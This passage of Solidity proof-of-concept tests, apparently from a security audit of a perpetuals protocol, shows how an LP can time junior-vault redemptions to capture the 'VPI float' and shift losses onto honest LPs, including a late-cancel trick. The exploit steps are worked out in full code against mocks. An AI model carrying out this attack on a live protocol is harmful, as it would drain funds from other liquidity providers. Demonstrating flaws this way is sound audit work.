    uint256 internal constant RELEASE_CONFIDENCE_MULTIPLIER_BPS = 2500;
    uint256 internal constant CONFIDENCE_SHIFT = MAX_CONFIDENCE * RELEASE_CONFIDENCE_MULTIPLIER_BPS / 10_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
    }

    function _configureReleaseConfidenceMultiplier() private {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = RELEASE_CONFIDENCE_MULTIPLIER_BPS;
        _setRouterConfig(config);
    }

    function _confidenceData() private returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(int64(uint64(MARK)), uint64(MAX_CONFIDENCE), -8, publishTime, publishTime - 1)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _openSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(
            CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, TRADER_MARGIN, MARK + CONFIDENCE_SHIFT, false
        );
        bytes[] memory data = _confidenceData();
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function _closeSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId =
            router.commitOrder(CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, 0, MARK - CONFIDENCE_SHIFT, true);
        bytes[] memory data = _confidenceData();
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function test_twentyPercentJuniorAtMaxAcceptedConfidence_isUnprofitable() public {
        _configureReleaseConfidenceMultiplier();
        Numbers memory numbers = _run(250_250e6, 4950, true);
        _log(numbers);
        int256 lpGain = int256(numbers.attackerLpAssetsOut) - int256(numbers.attackerLpDeposit);
        int256 traderNet = int256(numbers.traderBalanceAfter) - int256(TRADER_FUNDING);

        console2.log("configured max confidence (8-decimal price units)", MAX_CONFIDENCE);
        console2.log("adverse confidence shift per execution", CONFIDENCE_SHIFT);
        console2.log("attacker total after confidence and execution fees", lpGain + traderNet);

        assertApproxEqAbs(numbers.attackerShareBps, 2000, 2, "attacker should own approximately twenty percent");
        assertLt(lpGain + traderNet, 0, "realistic twenty-percent LP share is not profitable");
        assertGt(
            numbers.honestValueAfterClose,
            numbers.honestValueBeforeOpen,
            "confidence and fees should more than offset the captured float for the honest LP"
        );
    }

}
```

### `packages/perps/test/poc/VpiFloatNoTradeLpExit.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Variant 1 of the VPI float finding: an ordinary junior LP with NO trader position redeems while an UNRELATED
// trader's positive VPI charge sits in the pool. No trading cost is paid by the LP, so any junior share captures
// f * V versus fair value (V = k * S^2 / (2 D), the charge the open position can reclaim through its clamped close
// rebate). The LPs who stay fund the rebate when the unrelated trader closes skew-reducing.
//
// Also exercised: the redemption request can be cancelled up to the last second before the epoch boundary
// (TrancheVault.cancelRedeemRequest reverts only once currentLpEpoch() >= requestId), so an LP can queue a request
// before the five-minute cutoff, watch the aggregate skew, and keep or cancel the request with full information.
//
// Parameters: vpiFactor 0.01e18 (DEPLOYMENT.md release value), everything else BasePerpTest.
// Reuses the base contract from VpiFloatLpTiming.t.sol.

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

import {VpiFloatLpTimingBase} from "./VpiFloatLpTiming.t.sol";

contract VpiFloatNoTradeLpExitTest is VpiFloatLpTimingBase {

    address internal constant OPPORTUNIST_LP = address(0x0B5E51E1);
    address internal constant UNRELATED_TRADER = address(0x7A4DE501);
    uint256 internal constant LOT_NOTIONAL = 100e6;

    struct Outcome {
        uint256 lpDeposit;
        uint256 lpShareBps;
        uint256 skewBps;
        uint256 notional;
        uint256 vpiCharged;
        uint256 lpAssetsOut;
        int256 lpGain;
        uint256 honestBefore;
        uint256 honestAfterClose;
        int256 honestLoss;
        int256 traderNet;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
    }

    /// @dev Deposit that gives the opportunist LP `shareBps` of junior supply next to the 1,000,000 USDG honest LP.
    function _depositForShare(
        uint256 shareBps
    ) internal view returns (uint256) {
        uint256 honestAssets = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        return honestAssets * shareBps / (10_000 - shareBps);
    }

    function _feeOnNotional(
        uint256 notional
    ) internal pure returns (uint256) {
        return notional * 4 / 10_000;
    }

    function _lotsForSkew(
        uint256 skewBps
    ) internal view returns (uint256) {
        return pool.totalAssets() * skewBps / 10_000 / LOT_NOTIONAL;
    }

    function _openUnrelated(
        uint256 lots
    ) internal {
        _fundTrader(UNRELATED_TRADER, TRADER_FUNDING);
        _open(UNRELATED_TRADER, CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, TRADER_MARGIN, MARK);
    }

    function _closeUnrelated(
        uint256 lots
    ) internal {
        _close(UNRELATED_TRADER, CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, MARK);
    }

    /// @param floatPresentAtSettlement true: the unrelated position is open when the LP epoch settles (variant);
    ///        false: the unrelated trader has already closed when the LP epoch settles (control).
    /// @param openLeadSeconds how long before the boundary the unrelated open happens (the float does not decay;
    ///        this only shows the LP need not be synchronised with the trader).
    function _run(
        uint256 shareBps,
        uint256 skewBps,
        bool floatPresentAtSettlement,
        uint256 openLeadSeconds
    ) internal returns (Outcome memory o) {
        o.lpShareBps = shareBps;
        o.skewBps = skewBps;
        o.lpDeposit = _depositForShare(shareBps);

        // Ordinary LP joins at fair NAV (no skew) and waits out the cooldown.
        _fundJunior(OPPORTUNIST_LP, o.lpDeposit);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _refreshMark();
        o.lpShareBps = juniorVault.balanceOf(OPPORTUNIST_LP) * 10_000 / juniorVault.totalSupply();

        (uint256 requestEpoch,) = juniorVault.getRequestEpochWindow();
        (uint256 requestId, uint256 shares) = _requestRedeemAll(OPPORTUNIST_LP);
        o.honestBefore = _honestValue();

        // Unrelated trader builds skew some time before the boundary; the LP does nothing.
        vm.warp(pool.lpEpochStart(requestEpoch) - openLeadSeconds);
        _refreshMark();
        uint256 lots = _lotsForSkew(skewBps);
        o.notional = lots * LOT_NOTIONAL;
        _openUnrelated(lots);
        (,,,,,, int256 vpiAccrued) = engine.positions(UNRELATED_TRADER);
        o.vpiCharged = uint256(vpiAccrued);

        if (!floatPresentAtSettlement) {
            _closeUnrelated(lots);
        }

        _settleEpoch(requestEpoch);
        assertEq(juniorVault.claimableRedeemRequest(requestId, OPPORTUNIST_LP), shares, "redemption fully funded");
        o.lpAssetsOut = _claimRedeem(OPPORTUNIST_LP, requestId);
        o.lpGain = int256(o.lpAssetsOut) - int256(o.lpDeposit);

        if (floatPresentAtSettlement) {
            vm.warp(block.timestamp + 10);
            _closeUnrelated(lots);
        }
        _refreshMark();
        o.honestAfterClose = _honestValue();
        o.honestLoss = int256(o.honestBefore) - int256(o.honestAfterClose);
        o.traderNet = int256(clearinghouse.balanceAssets(UNRELATED_TRADER)) - int256(TRADER_FUNDING);
    }

    function _log(
        Outcome memory o
    ) internal pure {
        console2.log("LP share of junior (bps) / skew (bps)", o.lpShareBps, o.skewBps);
        console2.log("LP deposit / unrelated notional (atoms)", o.lpDeposit, o.notional);
        console2.log("VPI charged by unrelated trader (atoms)", o.vpiCharged);
        console2.log("LP assets out (atoms)", o.lpAssetsOut);
        console2.log("LP gain vs deposit (atoms)", o.lpGain);
        console2.log("expected f * V (atoms)", o.vpiCharged * o.lpShareBps / 10_000);
        console2.log("honest LP before / after unrelated close", o.honestBefore, o.honestAfterClose);
        console2.log("honest LP change at constant mark, before - after (atoms)", o.honestLoss);
        console2.log("close fee retained by the pool (atoms)", _feeOnNotional(o.notional));
        console2.log(
            "honest LP loss vs control f * (V - fee) (atoms)",
            (o.vpiCharged - _feeOnNotional(o.notional)) * o.lpShareBps / 10_000
        );
        console2.log("unrelated trader net (two fees, VPI refunded)", o.traderNet);
    }

    function _assertCapture(
        Outcome memory o
    ) internal pure {
        uint256 expected = o.vpiCharged * o.lpShareBps / 10_000;
        assertGt(o.lpGain, 0, "LP exit gains at zero trading cost");
        assertApproxEqAbs(uint256(o.lpGain), expected, 0.2e6, "LP gain equals its share of the float");
        // The pool keeps the trader's 4 bps close fee when a rebate offsets it (a separate low item: treasury
        // under-collects). Net of that windfall the continuing LP ends at before + fee - f * V; against the control
        // (same trades, exit priced after the close, fee shared) it is worse off by f * (V - fee).
        uint256 fee = _feeOnNotional(o.notional);
        assertApproxEqAbs(
            o.honestAfterClose, o.honestBefore + fee - expected, 1e6, "continuing LP funds f * V net of fee windfall"
        );
        assertLt(
            o.honestAfterClose + 1e6,
            o.honestBefore + fee - fee * o.lpShareBps / 10_000,
            "continuing LP worse off than in the control"
        );
        // The trader paid the VPI and got it back: only two 4 bps execution fees plus dust carry remain.
        assertApproxEqAbs(uint256(-o.traderNet), 2 * o.notional * 4 / 10_000, 2e6, "trader VPI refunded");
    }

    function _assertNoCapture(
        Outcome memory o
    ) internal pure {
        uint256 floatShare = o.vpiCharged * o.lpShareBps / 10_000;
        uint256 retainedFeeShare = o.notional * 4 / 10_000 * o.lpShareBps / 10_000;
        assertLe(o.lpGain, int256(retainedFeeShare) + 1e6, "at most the retained close fee share");
        uint256 positiveGain = o.lpGain > 0 ? uint256(o.lpGain) : 0;
        assertLt(positiveGain, floatShare / 4 + 1, "no float share captured");
        assertGe(o.honestAfterClose + 1e6, o.honestBefore, "continuing LP not diluted");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Headline: 10% LP, unrelated skew at the cap, open 30 minutes before the boundary.
    // ------------------------------------------------------------------------------------------------------------

    function test_v1_tenPercentLpNoTrade_capturesShareOfUnrelatedFloat() public {
        Outcome memory o = _run(1000, 3960, true, 30 minutes);
        _log(o);
        _assertCapture(o);
    }

    function test_v1_control_unrelatedCloseBeforeSettlement_noCapture() public {
        Outcome memory o = _run(1000, 3960, false, 30 minutes);
        _log(o);
        _assertNoCapture(o);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Sweep: gain as a function of skew (float size) and LP share. Each cell from the same post-setUp state.
    // ------------------------------------------------------------------------------------------------------------

    function test_v1_sweep_floatSizeAndLpShare() public {
        uint16[4] memory skews = [uint16(1000), 2000, 3000, 3960];
        uint16[3] memory shares = [uint16(1000), 2500, 5000];
        uint256 snap = vm.snapshotState();
        for (uint256 i; i < skews.length; ++i) {
            for (uint256 j; j < shares.length; ++j) {
                Outcome memory o = _run(shares[j], skews[i], true, 30 minutes);
                console2.log("--- sweep cell: skew bps / LP share bps", o.skewBps, o.lpShareBps);
                console2.log("    float V (atoms)", o.vpiCharged);
                console2.log("    LP gain (atoms)", o.lpGain);
                console2.log("    honest loss (atoms)", o.honestLoss);
                console2.log(
                    "    LP gain in hundredths of a bp of LP capital", uint256(o.lpGain) * 10_000 * 100 / o.lpDeposit
                );
                _assertCapture(o);
                vm.revertToState(snap);
                snap = vm.snapshotState();
            }
        }
    }

    // ------------------------------------------------------------------------------------------------------------
    // Persistence: the float does not decay. An LP exiting three boundaries after the open captures the same share.
    // ------------------------------------------------------------------------------------------------------------

    function test_v1_floatPersistsAcrossEpochs_exitThreeHoursLaterCapturesSameShare() public {
        uint256 deposit = _depositForShare(2500);
        _fundJunior(OPPORTUNIST_LP, deposit);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _refreshMark();
        uint256 shareBps = juniorVault.balanceOf(OPPORTUNIST_LP) * 10_000 / juniorVault.totalSupply();

        // Unrelated skew at the cap is built now and simply held.
        uint256 lots = _lotsForSkew(3960);
        _openUnrelated(lots);
        (,,,,,, int256 vpiAccrued) = engine.positions(UNRELATED_TRADER);
        uint256 vpiCharged = uint256(vpiAccrued);

        // Three boundaries pass with no LP activity (a boundary with no matured request cannot even be settled:
        // HousePool reverts with NoLpEpochProgress). The position simply stays open.
        vm.warp(block.timestamp + 3 hours);
        _refreshMark();
        uint256 honestBefore = _honestValue();
        uint256 honestFee = _closeFee(lots);

        // Only now does the LP request and exit.
        (uint256 requestEpoch,) = juniorVault.getRequestEpochWindow();
        (uint256 requestId,) = _requestRedeemAll(OPPORTUNIST_LP);
        _settleEpoch(requestEpoch);
        uint256 assetsOut = _claimRedeem(OPPORTUNIST_LP, requestId);
        int256 lpGain = int256(assetsOut) - int256(deposit);

        _closeUnrelated(lots);
        _refreshMark();
        uint256 honestAfter = _honestValue();

        console2.log("LP share (bps) / VPI float (atoms)", shareBps, vpiCharged);
        console2.log("LP gain after three idle epochs (atoms)", lpGain);
        console2.log("expected f * V (atoms)", vpiCharged * shareBps / 10_000);
        console2.log("honest LP loss (atoms)", int256(honestBefore) - int256(honestAfter));
        // The only drift over the idle hours is the hourly senior coupon on the 1,000 USDG seed (about 0.009 USDG
        // per hour, paid by junior); the float share is intact.
        assertApproxEqAbs(uint256(lpGain), vpiCharged * shareBps / 10_000, 0.1e6, "float share captured hours later");
        assertLt(
            honestAfter + 1e6,
            honestBefore + honestFee - honestFee * shareBps / 10_000,
            "continuing LP still funds the rebate (net of the retained fee windfall)"
        );
    }

    // ------------------------------------------------------------------------------------------------------------
    // Observe-and-cancel: a queued redemption can be cancelled one second before the boundary (inside the
    // five-minute quiet period), so the LP decides with full information about the float.
    // ------------------------------------------------------------------------------------------------------------

    struct CancelNumbers {
        uint256 deposit;
        uint256 shares;
        uint256 epochA;
        uint256 epochB;
        uint256 requestB;
    }

    /// @dev Hour 1: request before the cutoff, no float appears, cancel at boundary - 1 s. Then show the cooldown
    ///      restart re-arms the option two epochs later.
    function _cancelPhase() internal returns (CancelNumbers memory c) {
        c.deposit = _depositForShare(2500);
        _fundJunior(OPPORTUNIST_LP, c.deposit);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _refreshMark();

        uint256 cutoffA;
        (c.epochA, cutoffA) = juniorVault.getRequestEpochWindow();
        assertLt(block.timestamp, cutoffA, "request placed before the cutoff");
        (uint256 requestA, uint256 sharesA) = _requestRedeemAll(OPPORTUNIST_LP);
        c.shares = sharesA;
        vm.warp(pool.lpEpochStart(c.epochA) - 1);
        assertGt(block.timestamp, cutoffA, "we are inside the five-minute quiet period");
        assertLt(pool.currentLpEpoch(), requestA, "cancel precondition: epoch not yet started");
        vm.prank(OPPORTUNIST_LP);
        uint256 returned = juniorVault.cancelRedeemRequest(requestA, OPPORTUNIST_LP);
        assertEq(returned, sharesA, "all shares returned by the late cancel");
        assertEq(juniorVault.balanceOf(OPPORTUNIST_LP), sharesA, "shares back in the wallet");
        uint256 cancelTime = block.timestamp;

        // The cancel restarts the one-hour cooldown: the next request is possible at cancelTime + 1h, which is
        // after the next cutoff, so the option re-arms for the epoch after next (every second hour).
        vm.warp(cancelTime + juniorVault.DEPOSIT_COOLDOWN() - 1);
        vm.expectRevert();
        vm.prank(OPPORTUNIST_LP);
        juniorVault.requestRedeem(sharesA, OPPORTUNIST_LP, OPPORTUNIST_LP);
        vm.warp(cancelTime + juniorVault.DEPOSIT_COOLDOWN());
        _refreshMark();
        (c.epochB,) = juniorVault.getRequestEpochWindow();
        console2.log("cancelled for epoch / re-armed for epoch", c.epochA, c.epochB);
        assertEq(c.epochB, c.epochA + 2, "re-armed request lands two epochs after the cancelled one");
        (c.requestB,) = _requestRedeemAll(OPPORTUNIST_LP);
        assertEq(c.requestB, c.epochB, "request id is the epoch id");
    }

    /// @dev Hour 3: an unrelated trader builds skew during the hour; the LP sees it at boundary - 1 s and keeps.
    function _keepPhase(
        CancelNumbers memory c
    ) internal {
        uint256 honestBefore = _honestValue();
        vm.warp(pool.lpEpochStart(c.epochB) - 20 minutes);
        _refreshMark();
        uint256 lots = _lotsForSkew(3960);
        _openUnrelated(lots);
        (,,,,,, int256 vpiAccrued) = engine.positions(UNRELATED_TRADER);
        uint256 vpiCharged = uint256(vpiAccrued);
        vm.warp(pool.lpEpochStart(c.epochB) - 1);
        _refreshMark();
        uint256 shareBps = c.shares * 10_000 / juniorVault.totalSupply();
        console2.log("float observed one second before the boundary (atoms)", vpiCharged);

        _settleEpoch(c.epochB);
        uint256 assetsOut = _claimRedeem(OPPORTUNIST_LP, c.requestB);
        int256 lpGain = int256(assetsOut) - int256(c.deposit);
        _closeUnrelated(lots);
        _refreshMark();
        console2.log("LP share (bps) / expected f * V (atoms)", shareBps, vpiCharged * shareBps / 10_000);
        console2.log("LP gain (atoms)", lpGain);
        console2.log("honest LP loss (atoms)", int256(honestBefore) - int256(_honestValue()));
        assertApproxEqAbs(uint256(lpGain), vpiCharged * shareBps / 10_000, 1e6, "kept request captures f * V");
        uint256 fee = _closeFee(lots);
        assertLt(
            _honestValue() + 1e6,
            honestBefore + fee - fee * shareBps / 10_000,
            "continuing LP funds the rebate (net of the retained fee windfall)"
        );
    }

    function test_v1_requestCanBeCancelledOneSecondBeforeBoundary_thenKeptWhenFloatAppears() public {
        CancelNumbers memory c = _cancelPhase();
        _keepPhase(c);
    }

}
```

### `packages/perps/test/poc/VpiFloatLpTimingRelease.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

import {VpiFloatLpTimingBase} from "./VpiFloatLpTiming.t.sol";

contract VpiFloatLpTimingReleaseTest is VpiFloatLpTimingBase {

    address internal constant SENIOR_LP = address(0xA77AC0E3);
    uint256 internal constant SENIOR_DEPOSIT = 1_000_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 1_500_000e6;
    uint256 internal constant POSITION_LOTS = 13_860;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant RELEASE_CONFIDENCE_MULTIPLIER_BPS = 2500;
    uint256 internal constant MAX_CONFIDENCE = MARK * 10 / 10_000;
    uint256 internal constant CONFIDENCE_SHIFT = MAX_CONFIDENCE * RELEASE_CONFIDENCE_MULTIPLIER_BPS / 10_000;

    bool private useMaximumConfidence;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.fadMarginBps = 300;
    }

    function _basketData(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, 0));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _openSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(
            CfdTypes.Side.SHORT,
            lots * CfdTypes.SIZE_QUANTUM,
            TRADER_MARGIN,
            useMaximumConfidence ? MARK + CONFIDENCE_SHIFT : MARK,
            false
        );
        bytes[] memory data = useMaximumConfidence ? _confidenceData() : _mockPythUpdateData(MARK);
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function _closeSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(
            CfdTypes.Side.SHORT,
            lots * CfdTypes.SIZE_QUANTUM,
            0,
            useMaximumConfidence ? MARK - CONFIDENCE_SHIFT : 0,
            true
        );
        bytes[] memory data = useMaximumConfidence ? _confidenceData() : _mockPythUpdateData(MARK);
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function _confidenceData() private returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(int64(uint64(MARK)), uint64(MAX_CONFIDENCE), -8, publishTime, publishTime - 1)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _settleEpoch(
        uint256 epochId
    ) internal override {
        uint256 start = pool.lpEpochStart(epochId);
        if (block.timestamp < start) {
            vm.warp(start);
        }
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(MARK)), int32(-8), block.timestamp);
        vm.prank(ATTACKER_LP);
        router.settleLpEpoch(_basketData(MARK, block.timestamp));
    }

    function _configureReleaseLimits() private {
        _setSeniorCapacity(RELEASE_MAX_SENIOR_EXPOSURE, RELEASE_MAX_SENIOR_SHARE_BPS);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = RELEASE_CONFIDENCE_MULTIPLIER_BPS;
        _setRouterConfig(config);
        vm.warp(SETUP_TIMESTAMP + 2 hours);
        _refreshMark();
    }

    function _assertReleaseParameters() private view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,,,,,
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "release VPI factor");
        assertEq(maxSkewRatio, 0.4e18, "release skew cap");
        assertEq(maintMarginBps, 10, "release maintenance margin");
        assertEq(initMarginBps, 20, "release initial margin");
        assertEq(fadMarginBps, 300, "release frozen-market margin");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen-close spread");
        assertEq(pool.maxSeniorExposureAssets(), RELEASE_MAX_SENIOR_EXPOSURE, "release Senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), RELEASE_MAX_SENIOR_SHARE_BPS, "release Senior share cap");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence limit");
        assertEq(
            pletherOracle.adverseConfidenceMultiplierBps(),
            RELEASE_CONFIDENCE_MULTIPLIER_BPS,
            "release confidence multiplier"
        );
    }

    function test_releaseParameters_selfDealtExitRemainsProfitableAndJuniorLoses() public {
        _configureReleaseLimits();
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);
        _assertReleaseParameters();

        Numbers memory numbers = _run(ATTACKER_DEPOSIT, POSITION_LOTS, true);
        int256 lpGain = int256(numbers.attackerLpAssetsOut) - int256(numbers.attackerLpDeposit);
        int256 traderNet = int256(numbers.traderBalanceAfter) - int256(TRADER_FUNDING);
        int256 attackerNet = lpGain + traderNet;
        int256 remainingJuniorLoss = int256(numbers.honestValueBeforeOpen) - int256(numbers.honestValueAfterClose);

        console2.log("release MM / IM / FAD margin (bps)", uint256(10), uint256(20), uint256(300));
        console2.log("release execution fee / frozen-close spread (bps)", uint256(4), uint256(50));
        console2.log(
            "release confidence limit / multiplier (bps)",
            pletherOracle.basketMaxConfidenceRatioBps(),
            pletherOracle.adverseConfidenceMultiplierBps()
        );
        console2.log(
            "release Senior exposure cap / share cap (atoms, bps)",
            pool.maxSeniorExposureAssets(),
            pool.maxSeniorShareBps()
        );
        _log(numbers);
        console2.log("release attacker net (atoms)", attackerNet);
        console2.log("release remaining junior loss (atoms)", remainingJuniorLoss);

        assertGt(lpGain, 0, "release exit must capture positive VPI float");
        assertApproxEqAbs(
            TRADER_FUNDING - numbers.traderBalanceAfter,
            2 * _closeFee(POSITION_LOTS),
            2e6,
            "release trader leg must recover VPI and pay the two execution fees"
        );
        assertGt(attackerNet, 0, "self-dealt release path must remain profitable");
        assertGt(remainingJuniorLoss, 0, "remaining junior LP must lose principal");
    }

    function test_releaseParameters_maxAcceptedConfidence_remainsProfitableAndJuniorLoses() public {
        _configureReleaseLimits();
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);
        _assertReleaseParameters();
        useMaximumConfidence = true;

        Numbers memory numbers = _run(ATTACKER_DEPOSIT, POSITION_LOTS, true);
        int256 lpGain = int256(numbers.attackerLpAssetsOut) - int256(numbers.attackerLpDeposit);
        int256 traderNet = int256(numbers.traderBalanceAfter) - int256(TRADER_FUNDING);
        int256 attackerNet = lpGain + traderNet;
        int256 remainingJuniorLoss = int256(numbers.honestValueBeforeOpen) - int256(numbers.honestValueAfterClose);

        console2.log("maximum accepted confidence (8-decimal price units)", MAX_CONFIDENCE);
        console2.log("adverse confidence shift per execution", CONFIDENCE_SHIFT);
        _log(numbers);
        console2.log("max-confidence attacker net (atoms)", attackerNet);
        console2.log("max-confidence remaining junior loss (atoms)", remainingJuniorLoss);

        assertGt(attackerNet, 0, "large release-parameter attacker must remain profitable at maximum confidence");
        assertGt(remainingJuniorLoss, 0, "remaining junior LP must still lose at maximum confidence");
    }

}
```

